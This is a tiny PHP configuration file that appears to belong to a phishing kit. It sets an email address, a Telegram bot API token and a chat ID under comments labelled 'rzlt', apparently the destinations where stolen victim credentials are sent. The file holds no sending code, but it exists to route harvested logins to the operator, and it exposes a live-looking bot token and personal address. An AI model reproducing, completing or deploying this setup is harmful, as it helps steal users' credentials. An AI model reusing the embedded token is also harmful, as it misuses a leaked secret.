<?php

//Email rzlt
$email ="fiiilipjordan@gmail.com"; 

//Telegram rzlt
$api = "5189306864:AAEa0E0oCPVFlSMzjLL0mjhXp_jsAxPnAlY";
$chatid = "1700593159";


?>